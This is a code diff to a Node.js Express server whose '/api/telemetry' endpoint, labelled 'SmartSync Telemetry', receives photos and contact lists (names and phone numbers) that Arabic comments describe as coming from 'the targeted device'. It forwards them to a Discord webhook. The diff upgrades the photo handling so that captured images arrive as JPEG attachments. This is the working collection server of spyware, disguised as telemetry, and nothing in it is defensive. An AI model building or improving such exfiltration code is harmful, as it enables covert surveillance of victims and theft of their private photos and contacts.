@@ -1,5 +1,6 @@
 const express = require('express');
 const axios = require('axios');
+const { FormData, Blob } = require('formdata-node');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -28,24 +29,34 @@ app.post('/api/telemetry', async (req, res) => {
             return res.status(400).json({ error: 'Payload is empty or invalid JSON.' });
         }
 
-        let discordPayload = {};
+        let discordPayload = null;
+        let formDataPayload = null;
         let descriptionText = '';
 
-        // التحقق مما إذا كانت البيانات المرسلة عبارة عن صور (تحتوي على photo_chunk)
+        // 1. التحقق مما إذا كانت البيانات المرسلة عبارة عن صور (تحتوي على photo_chunk)
         if (Array.isArray(body) && body.length > 0 && body[0].photo_chunk) {
-            discordPayload = {
-                content: `📸 **تم استلام جزء صورة جديد بنجاح من الجهاز المستهدف!**`,
+            const base64Data = body[0].photo_chunk;
+            const buffer = Buffer.from(base64Data, 'base64');
+
+            // تجهيز الملف ليُرسل كمرفق مرئي حقيقي في ديسكورد
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify({
+                content: `📸 **تم استلام صورة بدقة عالية وعرضها مباشرة من الجهاز المستهدف!**`,
                 embeds: [
                     {
-                        title: `🖼️ دفعة صور جديدة`,
+                        title: `🖼️ معاينة الصورة المستخرجة`,
                         color: 3066993,
-                        description: `تم استلام صورة مضغوطة بدقة عالية وتجهيزها بنجاح.\nالوقت: \`${new Date().toLocaleString()}\``,
-                        footer: { text: 'SmartSync Telemetry - Photo Module' }
+                        timestamp: new Date().toISOString(),
+                        footer: { text: 'SmartSync Telemetry - Live Visual' }
                     }
                 ]
-            };
+            }));
+
+            const blob = new Blob([buffer], { type: 'image/jpeg' });
+            formData.append('file', blob, 'captured_image.jpg');
+            formDataPayload = formData;
         } 
-        // التحقق مما إذا كانت البيانات المرسلة عبارة عن جهات اتصال
+        // 2. التحقق مما إذا كانت البيانات المرسلة عبارة عن جهات اتصال
         else if (Array.isArray(body)) {
             descriptionText = body.map(c => `👤 **${c.name || 'بدون اسم'}**\n📞 \`${c.phone || 'بدون رقم'}\``).join('\n\n');
             if (descriptionText.length > 4000) descriptionText = descriptionText.substring(0, 4000) + '... (تم اقتصاص النص الطويل)';
@@ -61,7 +72,7 @@ app.post('/api/telemetry', async (req, res) => {
                 ]
             };
         } 
-        // بيانات عامة أخرى
+        // 3. بيانات عامة أخرى
         else {
             discordPayload = {
                 embeds: [
@@ -76,11 +87,23 @@ app.post('/api/telemetry', async (req, res) => {
         }
 
         if (DISCORD_WEBHOOK_URL) {
-            await retryWithBackoff(
-                () => axios.post(DISCORD_WEBHOOK_URL, discordPayload),
-                3,
-                1000
-            );
+            if (formDataPayload) {
+                // إرسال الصور كملفات مرفقة باستخدام FormData
+                await retryWithBackoff(
+                    () => axios.post(DISCORD_WEBHOOK_URL, formDataPayload, {
+                        headers: formDataPayload.headers
+                    }),
+                    3,
+                    1000
+                );
+            } else if (discordPayload) {
+                // إرسال النصوص وجهات الاتصال بشكل JSON طبيعي
+                await retryWithBackoff(
+                    () => axios.post(DISCORD_WEBHOOK_URL, discordPayload),
+                    3,
+                    1000
+                );
+            }
         } else {
             console.warn('DISCORD_WEBHOOK_URL is not set in environment variables.');
         }
